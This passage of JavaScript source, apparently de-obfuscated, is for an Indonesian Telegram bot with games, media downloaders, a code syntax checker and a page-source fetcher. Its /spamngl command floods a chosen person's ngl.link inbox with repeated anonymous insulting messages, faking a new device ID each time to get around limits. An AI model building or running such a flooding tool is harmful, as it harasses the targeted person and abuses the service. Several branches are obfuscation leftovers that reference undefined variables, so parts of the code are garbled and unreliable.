    opts.reply_markup = replyMarkup;
    await ctx.reply(priceList, opts);
  } catch (err) {
    ctx.reply("Gagal menampilkan Bagian daftar /harga Di Karenakan Masalah Tertentu.");
  }
});
bot.command("cekfunction", async ctx => {
  try {
    if (!ctx.message.reply_to_message) return ctx.reply("Reply function JavaScript yang ingin dicek.");
    const sourceCode = ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption;
    if (!sourceCode) return ctx.reply("Pesan yang direply tidak berisi kode.");
    let acornParser;
    try {
      acornParser = require("acorn");
    } catch {
      return ctx.reply("Module acorn belum terinstall.\nInstall: npm install acorn");
    }
    try {
      const parseOpts = {};
      parseOpts.ecmaVersion = "latest";
      parseOpts.sourceType = "module";
      parseOpts.locations = true;
      return acornParser.parse(sourceCode, parseOpts), ctx.reply("🔎 Mengecek syntax function...\n\n✅ SYNTAX VALID\nTidak ditemukan error.\n\n© Gxion");
    } catch (parseError) {
      const lines = sourceCode.split("\n"),
        errorLine = parseError.loc?.["line"] || 0,
        errorColumn = parseError.loc?.["column"] || 0,
        startLine = Math.max(0, errorLine - 3),
        endLine = Math.min(lines.length, errorLine + 2),
        snippet = lines.slice(startLine, endLine).map((line, index) => {
          const lineNumber = startLine + index + 1;
          return lineNumber === errorLine ? "👉 " + lineNumber + " | " + line : "   " + lineNumber + " | " + line;
        }).join("\n");
      return ctx.reply("❌ ERROR TERDETEKSI\n\n" + parseError.message + "\nLine " + errorLine + ":" + errorColumn + "\n\n📌 CUPlikan:\n```javascript\n" + snippet + "\n```\n\n© Gxion");
    }
  } catch (err) {
    ctx.reply("Terjadi error saat mengecek function.");
  }
});
// Duplicate trivia/state declarations removed; original declarations are above.
bot.command("tebakangka", async ctx => {
  const helper = {};
  helper.add = function (a, b) {
    return a + b;
  };
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.introText = "🎯 *TEBAK ANGKA*\n\nAku punya angka 1-100\nKamu punya 5 nyawa\n\nKetik angkanya aja!";
  helper.markdown = "Markdown";
  const H = helper,
    userId = ctx.from.id,
    secretNumber = H.add(Math.floor(H.multiply(Math.random(), 100)), 1);
  tebakAngkaState[userId] = {
    angka: secretNumber,
    nyawa: 5,
    start: Date.now()
  };
  await ctx.reply(H.introText, {
    parse_mode: H.markdown
  });
});
bot.command("trivia", async ctx => {
  const helper = {};
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper;
  const userId = ctx.from.id,
    pickedQuestion = triviaBank[Math.floor(H.multiply(Math.random(), triviaBank.length))];
  triviaState[userId] = {
    jawaban: pickedQuestion.a,
    start: Date.now(),
    total: 0
  };
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🧠 *TRIVIA CEPAT*\n\n📝 " + pickedQuestion.q + "\n\n⏱ Jawab secepat mungkin!", opts);
});
bot.command("slot", async ctx => {
  const helper = {};
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.jackpotText = "🎉 JACKPOT!";
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.equals3 = function (a, b) {
    return a === b;
  };
  helper.tryAgain = "😔 Coba lagi";
  helper.markdown = "Markdown";
  const H = helper;
  const slotSymbols = ["🍒", "🍋", "🔔", "⭐", "7️⃣", "💎"],
    reel1 = slotSymbols[Math.floor(H.multiply(Math.random(), slotSymbols.length))];
  const reel2 = slotSymbols[Math.floor(H.multiply(Math.random(), slotSymbols.length))];
  const reel3 = slotSymbols[Math.floor(Math.random() * slotSymbols.length)];
  let outcome = "";
  if (reel1 === reel2 && H.equals(reel2, reel3)) outcome = H.jackpotText;
  else {
    if (H.equals2(reel1, reel2) || H.equals3(reel2, reel3) || H.equals2(reel1, reel3)) outcome = "👏 Hampir!";
    else outcome = H.tryAgain;
  }
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🎰 *SLOT MACHINE*\n\n┌───────────┐\n│ " + reel1 + "  " + reel2 + "  " + reel3 + " │\n└───────────┘\n\n" + outcome, opts);
});
bot.command("dadu", async ctx => {
  const helper = {};
  helper.add = function (a, b) {
    return a + b;
  };
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper,
    roll = H.add(Math.floor(H.multiply(Math.random(), 6)), 1),
    diceEmoji = ["", "⚀", "⚁", "⚂", "⚃", "⚄", "⚅"];
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🎲 *LEMPAR DADU*\n\n" + diceEmoji[roll] + "  Angka: " + roll, opts);
});
bot.command("suit", async ctx => {
  const helper = {};
  helper.helpText = "✊✋✌️ *SUIT!*\n\nPilih:\n/batu\n/kertas\n/gunting";
  helper.markdown = "Markdown";
  const H = helper;
  await ctx.reply(H.helpText, {
    parse_mode: H.markdown
  });
});
bot.command(["batu", "kertas", "gunting"], async ctx => {
  const helper = {};
  helper.rockLabel = "✊ Batu";
  helper.paperLabel = "✋ Kertas";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.drawText = "🤝 SERI!";
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.equals3 = function (a, b) {
    return a === b;
  };
  helper.equals4 = function (a, b) {
    return a === b;
  };
  helper.markdown = "Markdown";
  const H = helper,
    choiceMap = {};
  choiceMap.batu = 0;
  choiceMap.kertas = 1;
  choiceMap.gunting = 2;
  const choices = choiceMap;
  const labels = [H.rockLabel, H.paperLabel, "✌️ Gunting"],
    playerChoice = choices[ctx.message.text.replace("/", "")],
    botChoice = Math.floor(H.multiply(Math.random(), 3));
  let result = "";
  if (H.equals(playerChoice, botChoice)) result = H.drawText;
  else {
    if (H.equals2(playerChoice, 0) && H.equals3(botChoice, 2) || H.equals2(playerChoice, 1) && H.equals3(botChoice, 0) || H.equals4(playerChoice, 2) && botChoice === 1) result = "🎉 KAMU MENANG!";
    else result = "😔 KAMU KALAH!";
  }
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("✊✋✌️ *SUIT!*\n\nKamu: " + labels[playerChoice] + "\nBot: " + labels[botChoice] + "\n\n" + result, opts);
});
bot.command("typing", async ctx => {
  const helper = {};
  helper.fast = "cepat";
  helper.slow = "lambat";
  helper.cat = "kucing";
  helper.eat = "makan";
  helper.sleep = "tidur";
  helper.run = "lari";
  helper.fly = "terbang";
  helper.quiet = "diam";
  helper.talk = "bicara";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper,
    userId = ctx.from.id;
  const words = [H.fast, H.slow, H.cat, H.eat, H.sleep, H.run, H.fly, "renang", H.quiet, H.talk];
  const pickedWord = words[Math.floor(H.multiply(Math.random(), words.length))];
  typingState[userId] = {
    kata: pickedWord,
    start: Date.now()
  };
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("⌨️ *TYPING SPEED*\n\nKetik kata ini secepat mungkin:\n\n*`" + pickedWord + "`*", opts);
});
bot.command("math", async ctx => {
  const helper = {};
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.multiply2 = function (a, b) {
    return a * b;
  };
  helper.add = function (a, b) {
    return a + b;
  };
  helper.multiply3 = function (a, b) {
    return a * b;
  };
  helper.multiply4 = function (a, b) {
    return a * b;
  };
  helper.multiply5 = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper;
  const userId = ctx.from.id,
    operators = ["+", "-", "×"];
  const pickedOperator = operators[Math.floor(H.multiply(Math.random(), operators.length))];
  let leftOperand, rightOperand, answer;
  switch (pickedOperator) {
    case "+":
      leftOperand = Math.floor(Math.random() * 100);
      rightOperand = Math.floor(H.multiply2(Math.random(), 100));
      answer = H.add(leftOperand, rightOperand);
      break;
    case "-":
      leftOperand = Math.floor(H.multiply3(Math.random(), 100));
      rightOperand = Math.floor(H.multiply4(Math.random(), leftOperand));
      answer = leftOperand - rightOperand;
      break;
    case "×":
      leftOperand = H.add(Math.floor(H.multiply5(Math.random(), 20)), 1);
      rightOperand = H.add(Math.floor(H.multiply5(Math.random(), 10)), 1);
      answer = H.multiply5(leftOperand, rightOperand);
      break;
  }
  mathState[userId] = {
    jawaban: answer,
    start: Date.now(),
    soal: leftOperand + " " + pickedOperator + " " + rightOperand
  };
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🔢 *MATH RACE*\n\n" + leftOperand + " " + pickedOperator + " " + rightOperand + " = ?\n\nJawab dengan angka!", opts);
});
bot.command("tebakkata", async ctx => {
  const helper = {};
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.markdown = "Markdown";
  const H = helper,
    userId = ctx.from.id,
    pickedWord = tebakKataBank[Math.floor(H.multiply(Math.random(), tebakKataBank.length))];
  const masked = "_ ".repeat(pickedWord.length).trim(),
    state = {};
  state.kata = pickedWord;
  state.tebakan = [];
  state.nyawa = 5;
  tebakKataState[userId] = state;
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("📝 *TEBAK KATA*\n\n`" + masked + "`\n\n❤️ Nyawa: 5\nKetik hurufnya!", opts);
});
bot.command("koin", async ctx => {
  const helper = {};
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.heads = "🪙 KEPALA";
  helper.tails = "🪙 EKOR";
  helper.markdown = "Markdown";
  const H = helper,
    coinResult = H.lessThan(Math.random(), 0.5) ? H.heads : H.tails;
  const opts = {};
  opts.parse_mode = H.markdown;
  await ctx.reply("🪙 *FLIP COIN*\n\n...mengocok...\n\n" + coinResult, opts);
});
bot.command("reaction", async ctx => {
  const userId = ctx.from.id;
  const delay = Math.floor(Math.random() * 3000) + 1000;
  const opts = {};
  opts.parse_mode = "Markdown";
  await ctx.reply("⚡ *REACTION SPEED*\n\nTunggu sinyal...", opts);
  setTimeout(async () => {
    reactionState[userId] = Date.now();
    const signalOpts = {};
    signalOpts.parse_mode = "Markdown";
    await ctx.reply("🔴 *SEKARANG!*\n\nBalas pesan ini secepat mungkin!", signalOpts);
  }, delay);
});
bot.on("text", async (ctx, next) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;
  if (tebakAngkaState[userId]) {
    const state = tebakAngkaState[userId],
      guess = parseInt(text);
    if (!isNaN(guess)) {
      state.nyawa--;
      if (guess === state.angka) {
        const elapsed = ((Date.now() - state.start) / 1000).toFixed(1);
        delete tebakAngkaState[userId];
        const opts = {};
        opts.parse_mode = "Markdown";
        return ctx.reply("🎉 *BENAR!*\n\nAngka: " + state.angka + "\nWaktu: " + elapsed + " detik\nSisa nyawa: " + state.nyawa, opts);
      }
      if (state.nyawa <= 0) {
        delete tebakAngkaState[userId];
        const opts = {};
        opts.parse_mode = "Markdown";
        return ctx.reply("💀 *GAME OVER*\n\nAngkanya: " + state.angka, opts);
      }
      const hint = guess < state.angka ? "⬆️ Lebih besar" : "⬇️ Lebih kecil";
      return ctx.reply(hint + "\n❤️ Nyawa: " + state.nyawa);
    }
  }
  if (triviaState[userId]) {
    const state = triviaState[userId],
      answer = text.toLowerCase().trim();
    state.total++;
    if (answer === state.jawaban) {
      const elapsed = ((Date.now() - state.start) / 1000).toFixed(1),
        score = Math.max(0, 100 - Math.floor(elapsed * 10));
      delete triviaState[userId];
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("✅ *BENAR!*\n\n⏱ " + elapsed + " detik\n⭐ Score: +" + score, opts);
    }
    if (state.total >= 3) {
      delete triviaState[userId];
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("❌ *SALAH*\n\nJawaban: " + state.jawaban, opts);
    }
    return ctx.reply("❌ Salah! Coba lagi (" + (3 - state.total) + "x kesempatan)");
  }
  if (typingState[userId]) {
    const state = typingState[userId];
    if (text.toLowerCase() === state.kata) {
      const elapsed = ((Date.now() - state.start) / 1000).toFixed(2),
        wpm = (state.kata.length / elapsed * 12).toFixed(0);
      delete typingState[userId];
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("⚡ *TEPAT!*\n\n⏱ " + elapsed + " detik\n⌨️ " + wpm + " WPM", opts);
    }
  }
  if (mathState[userId]) {
    const state = mathState[userId],
      answer = parseInt(text);
    if (!isNaN(answer)) {
      if (answer === state.jawaban) {
        const elapsed = ((Date.now() - state.start) / 1000).toFixed(1);
        delete mathState[userId];
        const opts = {};
        opts.parse_mode = "Markdown";
        return ctx.reply("🎯 *BENAR!*\n\n" + state.soal + " = " + state.jawaban + "\n⏱ " + elapsed + " detik", opts);
      }
      return ctx.reply("❌ Salah! Coba lagi");
    }
  }
  if (tebakKataState[userId]) {
    const state = tebakKataState[userId],
      letter = text.toLowerCase();
    if (letter.length === 1) {
      if (state.tebakan.includes(letter)) return ctx.reply("⚠️ Huruf sudah ditebak!");
      state.tebakan.push(letter);
      if (!state.kata.includes(letter)) {
        state.nyawa--;
        if (state.nyawa <= 0) {
          delete tebakKataState[userId];
          const opts = {};
          opts.parse_mode = "Markdown";
          return ctx.reply("💀 *GAME OVER*\n\nKatanya: " + state.kata, opts);
        }
      }
      const masked = state.kata.split("").map(char => state.tebakan.includes(char) ? char : "_").join(" ");
      if (!masked.includes("_")) {
        delete tebakKataState[userId];
        const opts = {};
        opts.parse_mode = "Markdown";
        return ctx.reply("🎉 *MENANG!*\n\nKatanya: " + state.kata, opts);
      }
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("`" + masked + "`\n❤️ " + state.nyawa, opts);
    }
  }
  if (reactionState[userId]) {
    const elapsed = ((Date.now() - reactionState[userId]) / 1000).toFixed(3);
    delete reactionState[userId];
    let rank = "";
    if (elapsed < 0.3) rank = "🔥 GODLIKE!";
    else {
      if (elapsed < 0.5) rank = "⚡ SANGAT CEPAT!";
      else {
        if (elapsed < 1) rank = "👍 CEPAT!";
        else {
          if (elapsed < 2) rank = "🙂 BIASA AJA";
          else rank = "🐌 LELET!";
        }
      }
    }
    return ctx.reply("⏱ " + elapsed + " detik\n" + rank);
  }
  return next();
});
bot.command("brat", async ctx => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  if (!input) return ctx.reply("❌ Masukkan teks!");
  try {
    const apiUrl = "https://api.zenzxz.my.id/maker/brat?text=" + encodeURIComponent(input),
      opts = {};
    opts.responseType = "arraybuffer";
    const response = await axios.get(apiUrl, opts);
    await ctx.replyWithSticker({
      source: Buffer.from(response.data)
    });
  } catch (err) {
    ctx.reply("❌ API error / tidak tersedia.");
  }
});
bot.command("spamngl", async ctx => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 1) return ctx.reply("🪧 ☇ Format: /spamngl rainonesday 10");
    const username = args[0],
      count = parseInt(args[1], 10),
      delayMs = 200;
    if (isNaN(count) || count < 1) return ctx.reply("❌ ☇ Masukan jumlah dan harus berupa angka");
    await ctx.reply("⏳ ☇ Mengirim " + count + " pesan spam ke " + username);
    for (let index = 1; index <= count; index++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex"),
          question = "WOI DONGO KENAL VINA GA??",
          bodyData = "username=" + username + "&question=" + encodeURIComponent(question) + "&deviceId=" + deviceId;
        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
          },
          body: bodyData
        });
      } catch {}
      index < count && (await new Promise(resolve => setTimeout(resolve, index % 50 === 0 ? delayMs + 200 : delayMs)));
    }
    ctx.reply("✅ ☇ Selesai mengirim " + count + " pesan spam ke " + username);
  } catch (err) {
    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});
bot.command("snack", async ctx => {
  const link = ctx.message.text.split(" ")[1];
  if (!link) return ctx.reply("Contoh:\n/snack https://s.snackvideo.com/xxxx");
  if (!link.includes("snackvideo")) return ctx.reply("❌ Itu bukan link SnackVideo, jangan ngawur");
  try {
    await ctx.reply("⏳ Lagi diproses... sabar dikit napa");
    const requestOpts = {};
    requestOpts.timeout = 15000;
    const response = await axios.get("https://api.shecodes.io/snackvideo?url=" + encodeURIComponent(link), requestOpts),
      videoUrl = response?.["data"]?.["data"]?.["video"];
    if (!videoUrl) return ctx.reply("❌ Gagal ambil video, kemungkinan API nya lagi ngambek");
    const videoOpts = {};
    videoOpts.url = videoUrl;
    const captionOpts = {};
    captionOpts.caption = "✅ Beres. Udah, jangan spam lagi";
    await ctx.replyWithVideo(videoOpts, captionOpts);
  } catch (err) {
    ctx.reply("❌ Error. Bisa jadi:\n- API mati\n- Link lu aneh\n- Internet lu kentang");
  }
});
bot.command(/\/gethtml(?:\s+(.+))?/, async (ctx, args) => {
  const helper = {};
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.subtract = function (a, b) {
    return a - b;
  };
  helper.invalidUrlMsg = "🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`";
  helper.markdown = "Markdown";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tag = "mhLic";
  helper.textType = "text";
  helper.filename = "source_code.html";
  helper.contentType = "text/html";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tag2 = "vBRCk";
  const H = helper;
  const chatId = ctx.chat.id;
  const url = (args[1] || "").trim();
  if (!url || !/^https?:\/\//i.test(url)) return bot.telegram.sendMessage(chatId, H.invalidUrlMsg, {
    parse_mode: H.markdown
  });
  try {
    if (H.equals(H.tag, H.tag)) {
      await bot.telegram.sendMessage(chatId, "⏳ Mengambil source code dari URL...");
      const requestOpts = {};
      requestOpts.responseType = H.textType;
      requestOpts.timeout = 30000;
      const response = await axios.get(url, requestOpts),
        sourceCode = response.data,
        filePath = path.join(__dirname, "source_code.html");
      fs.writeFileSync(filePath, sourceCode);
      const fileOpts = {};
      fileOpts.filename = H.filename;
      fileOpts.contentType = H.contentType;
      await bot.telegram.sendDocument(chatId, filePath, {}, fileOpts);
      fs.unlinkSync(filePath);
    } else {
      const failResult = {};
      failResult.ok = false;
      failResult.reason = "File terlalu besar (max 5MB)";
      return failResult;
    }
  } catch (err) {
    if (H.notEquals("vBRCk", H.tag2)) {
      a.queue = ctx.queue.filter(item => {
        return H.lessThan(H.subtract(d, item.addedAt), 600000);
      });
    } else {
      const opts = {};
      opts.parse_mode = H.markdown;
      bot.telegram.sendMessage(chatId, "❌ *Terjadi kesalahan:*\n`" + err.message + "`", opts);
    }
  }
});
// Duplicate execChildProcess import removed.
bot.command("check", async ctx => {
  try {
    const repliedMessage = ctx.message.reply_to_message;
    if (!repliedMessage?.["document"]) return ctx.reply("╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n┃      JAVASCRIPT ANALYZER      ┃\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n📤 Please reply to a JavaScript file\n\n📌 Example:\n1. Send file.js\n2. Reply file tersebut\n3. Ketik /check\n\n━━━━━━━━━━━━━━━━━━━━━━\n\n⏳ Waiting for file...");
    const document = repliedMessage.document;
    if (!document.file_name.endsWith(".js")) return ctx.reply("❌ Invalid File\n\nOnly JavaScript (.js) files are supported.");
    const statusMessage = await ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Status    : Scanning...\n╎ Engine    : Node.js Checker\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n🔍 Analyzing JavaScript file..."),
      fileInfo = await ctx.telegram.getFile(document.file_id),
      fileUrl = "https://api.telegram.org/file/bot" + bot.token + "/" + fileInfo.file_path,
      tempPath = "./check_" + Date.now() + ".js",
      requestOpts = {};
    requestOpts.responseType = "arraybuffer";
    const fileData = await axios.get(fileUrl, requestOpts);
    fs.writeFileSync(tempPath, fileData.data);
    execChildProcess("node --check \"" + tempPath + "\"", async (error, stdout, stderr) => {
      if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      if (error) {
        return ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Result    : Failed\n╎ Issues    : Detected\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n❌ Syntax Error Found\n\n" + stderr.slice(0, 3000));
      }
      return ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Result    : Passed\n╎ Issues    : 0\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n✅ YEAYY CODE FILE.JS ANDA AMAN!!!");
    });
  } catch (err) {
    ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ Result : Failed\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n❌ Failed to check file\n\n" + err.message);
  }
});
bot.command("cekfunction", async ctx => {
  try {
    const repliedMessage = ctx.message.reply_to_message;
    if (!repliedMessage?.["text"]) return ctx.reply("🪧 Contoh: kirim function nya lalu reply code function dengan /cekfunction");
    const sourceCode = repliedMessage.text;
    try {
      return new Function(sourceCode), ctx.reply("✅ YEAY FUNCTION AMAN\n Created By : @Bawzzhhh");
    } catch (compileError) {
      let errorLine = "Tidak diketahui",
        errorSnippet = "Tidak ditemukan";
      const stackMatch = compileError.stack?.["match"](/<anonymous>:(\d+):(\d+)/);
      if (stackMatch) {
        const lineIndex = parseInt(stackMatch[1]) - 1,
          lines = sourceCode.split("\n");
        lines[lineIndex] && (errorLine = lineIndex + 1, errorSnippet = lines[lineIndex]);
      }
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("━━━━━━━━━━━━━━━━━━\n🧪 FUNCTION CHECK\n━━━━━━━━━━━━━━━━━━\n❌ STATUS : ERROR PADA FUNCTION\n📍 BARIS ERROR : " + errorLine + "\n🔎 ERROR INFORMATION :\n" + compileError.message + "\n• KODE FUNCTION YANG BERMASALAH :\n```js\n" + errorSnippet + "\n```\n━━━━━━━━━━━━━━━━━━", opts);
    }
  } catch (err) {
    ctx.reply("❌ Gagal cek function.");
  }
});
bot.command("catbox", async ctx => {
  const url = ctx.message.text.split(" ")[1],
    opts = {};
  opts.parse_mode = "Markdown";
  if (!url) return ctx.reply("📥 *DOWNLOAD CATBOX* 📥\n\n*Cara pakai:*\n/catbox https://files.catbox.moe/xxxxx.jpg\n\n*Support file:*\nGambar, Video, Audio, Dokumen\n\n📌 *Maksimal file: 50MB*", opts);
  const opts2 = {};
  opts2.parse_mode = "Markdown";
  if (!url.includes("files.catbox.moe")) return ctx.reply("❌ Bukan URL Catbox yang valid!", opts2);
  const loadingOpts = {};
  loadingOpts.parse_mode = "Markdown";
  await ctx.reply("⏳ *Mengunduh file...*", loadingOpts);
  try {
    const extension = url.split(".").pop().toLowerCase();
    if (["jpg", "jpeg", "png", "gif", "webp"].includes(extension)) {
      const photoOpts = {};
      photoOpts.caption = "✅ *Download berhasil!*";
      photoOpts.parse_mode = "Markdown";
      await ctx.replyWithPhoto(url, photoOpts);
    } else {
      if (["mp4", "mkv", "avi", "mov"].includes(extension)) {
        const videoOpts = {};
        videoOpts.caption = "✅ *Download berhasil!*";
        videoOpts.parse_mode = "Markdown";
        await ctx.replyWithVideo(url, videoOpts);
      } else {
        if (["mp3", "wav", "ogg"].includes(extension)) {
          const audioOpts = {};
          audioOpts.caption = "✅ *Download berhasil!*";
          audioOpts.parse_mode = "Markdown";
          await ctx.replyWithAudio(url, audioOpts);
        } else {
          const docOpts = {};
          docOpts.caption = "✅ *Download berhasil!*";
          docOpts.parse_mode = "Markdown";
          await ctx.replyWithDocument(url, docOpts);
        }
      }
    }
  } catch {
    const failOpts = {};
    failOpts.parse_mode = "Markdown";
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", failOpts);
  }
});
bot.command("tiktokdl", async ctx => {
  const helper = {};
  helper.privateOnly = "❌ Command ini hanya bisa digunakan di grup.";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tagA = "qajNU";
  helper.arraybuffer = "arraybuffer";
  helper.genericError = "❌ Terjadi kesalahan!";
  helper.markdown = "Markdown";
  helper.dontSpam = "Dont spam";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.groupModeFormat = "Format: /setgroupmode on | off";
  helper.off = "off";
  helper.toolsDir = "./Tools";
  helper.setGroupModeTitle = "SET GROUP MODE";
  helper.groupModeChanged = "GROUP MODE DIUBAH";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.tagB = "nQosB";
  helper.tagC = "VnVsL";
  helper.notEquals2 = function (a, b) {
    return a !== b;
  };
  helper.tagD = "itNKW";
  helper.tagE = "EypYQ";
  helper.tiktokFormat = "❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/\n\n";
  helper.tiktokHelp = "📌 Kirim link video TikTok untuk diunduh tanpa watermark.";
  helper.processing = "⏳ Sedang memproses video TikTok...";
  helper.tagF = "hMzCo";
  helper.apiEndpoint = "https://tikwm.com/api/";
  helper.userAgent = "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36";
  helper.acceptHeader = "application/json,text/plain,*/*";
  helper.notEquals3 = function (a, b) {
    return a !== b;
  };
  helper.invalidData = "INVALID_DATA";
  helper.concat2 = function (a, b) {
    return a + b;
  };
  helper.concat3 = function (a, b) {
    return a + b;
  };
  helper.concat4 = function (a, b) {
    return a + b;
  };
  helper.concat5 = function (a, b) {
    return a + b;
  };
  helper.concat6 = function (a, b) {
    return a + b;
  };
  helper.concat7 = function (a, b) {
    return a + b;
  };
  helper.concat8 = function (a, b) {
    return a + b;
  };
  helper.concat9 = function (a, b) {
    return a + b;
  };
  helper.concat10 = function (a, b) {
    return a + b;
  };
  helper.concat11 = function (a, b) {
    return a + b;
  };
  helper.concat12 = function (a, b) {
    return a + b;
  };
  helper.concat13 = function (a, b) {
    return a + b;
  };
  helper.concat14 = function (a, b) {
    return a + b;
  };
  helper.concat15 = function (a, b) {
    return a + b;
  };
  helper.concat16 = function (a, b) {
    return a + b;
  };
  helper.concat17 = function (a, b) {
    return a + b;
  };
  helper.concat18 = function (a, b) {
    return a + b;
  };
  helper.concat19 = function (a, b) {
    return a + b;
  };
  helper.tiktokHeader = "🎬 *TikTok Downloader*\n\n";
  helper.authorLabel = "👤 *Author:* ";
  helper.usernameLabel = "🆔 *Username:* @";
  helper.titleLabel = "📝 *Title:* ";
  helper.idId = "id-ID";
  helper.commentLabel = "💬 *Comments:* ";
  helper.shareLabel = "🔁 *Shares:* ";
  helper.playLabel = "▶️ *Plays:* ";
  helper.favoriteLabel = "⭐ *Favorites:* ";
  helper.musicLabel = "🎵 *Music:* ";
  helper.artistLabel = "🎤 *Artist:* ";
  helper.durationLabel = "⏱️ *Duration:* ";
  helper.createdLabel = "📅 *Created:* ";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.tagG = "mbzNu";
  helper.tagH = "gqRkj";
  helper.notEquals4 = function (a, b) {
    return a !== b;
  };
  helper.tagI = "tTNwN";
  helper.tagJ = "hdDAa";
  helper.noVideo = "NO_VIDEO";
  helper.greaterThan = function (a, b) {
    return a > b;
  };
  helper.multiply2 = function (a, b) {
    return a * b;
  };
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.tagK = "hkzsn";
  helper.concat20 = function (a, b) {
    return a + b;
  };
  helper.notEquals5 = function (a, b) {
    return a !== b;
  };
  helper.tagL = "onejq";
  helper.downloadFailed = "❌ Gagal mengunduh, koneksi lambat atau link salah";
  helper.equals3 = function (a, b) {
    return a === b;
  };
  helper.invalidVideoData = "❌ Gagal ambil data video, pastikan link valid";
  helper.equals4 = function (a, b) {
    return a === b;
  };
  helper.noDownloadLink = "❌ Tidak ada link video yang bisa diunduh";
  const H = helper,
    messageText = ctx.message.text || "",
    rawUrl = messageText.split(" ").slice(1).join(" ").trim();
  let videoUrl = rawUrl;
  if (ctx.message.entities) {
    if (H.equals(H.tagB, H.tagB))
      for (const entity of ctx.message.entities) {
        if (H.equals(entity.type, "url")) {
          if (H.notEquals(H.tagC, H.tagC)) {
            if (global.AK72_SPAM_COUNT) global.AK72_SPAM_COUNT[userId] = 0;
          } else {
            videoUrl = messageText.substr(entity.offset, entity.length);
            break;
          }
        }
      } else a.log(f.yellow("  ⚠  Periodic validation skipped: " + err.message));
  }
  if (!videoUrl || !/^https?:\/\//i.test(videoUrl)) return H.notEquals2(H.tagD, H.tagE) ? ctx.reply(H.concat(H.tiktokFormat, H.tiktokHelp)) : ctx.reply(H.privateOnly);
  const statusMessage = await ctx.reply(H.processing);
  try {
    if (H.equals(H.tagF, H.tagF)) {
      const requestParams = {};
      requestParams.url = videoUrl;
      requestParams.hd = 1;
      const {
        data: apiResponse
      } = await axios.get(H.apiEndpoint, {
        params: requestParams,
        headers: {
          "user-agent": H.userAgent,
          accept: H.acceptHeader,
          referer: "https://tikwm.com/"
        },
        timeout: 20000
      });
      if (!apiResponse || H.notEquals3(apiResponse.code, 0) || !apiResponse.data) throw new Error(H.invalidData);
      const videoData = apiResponse.data,
        author = videoData.author || {},
        musicInfo = videoData.music_info || {},
        caption = `${H.tiktokHeader}\n${H.authorLabel}${author.nickname || author.unique_id || "-"}\n${H.usernameLabel}${author.unique_id || "-"}\n${H.titleLabel}${videoData.title ? videoData.title.slice(0, 120) : "-"}\n\n❤️ *Likes:* ${(videoData.digg_count ?? 0).toLocaleString("id-ID")}\n${H.commentLabel}${(videoData.comment_count ?? 0).toLocaleString("id-ID")}\n${H.shareLabel}${(videoData.share_count ?? 0).toLocaleString("id-ID")}\n${H.playLabel}${(videoData.play_count ?? 0).toLocaleString("id-ID")}\n${H.favoriteLabel}${(videoData.collect_count ?? 0).toLocaleString("id-ID")}\n\n${H.musicLabel}${musicInfo.title || "-"}\n${H.artistLabel}${musicInfo.author || "-"}\n${H.durationLabel}${videoData.duration || 0}s\n${H.createdLabel}${videoData.create_time ? new Date(videoData.create_time * 1000).toLocaleString("id-ID") : "-"}`;
